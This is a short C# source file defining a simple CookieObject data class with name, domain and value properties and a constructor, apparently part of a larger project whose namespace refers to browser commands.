namespace Master.Commands.BrowserTornado
{
    /// <summary>
    /// Class used to instanciate cookies
    /// </summary>
    internal class CookieObject
    {
        public string name { get; set; }

        public string domain { get; set; }

        public string value { get; set; }

        /// <summary>
        /// Constructor
        /// </summary>
        /// <param name="name">Name of the cookie</param>
        /// <param name="domain">Domain from owning the cookie</param>
        /// <param name="value">Value of the cookie</param>
        public CookieObject(string name, string domain, string value)
        {
            this.name = name;
            this.domain = domain;
            this.value = value;
        }
    }
}
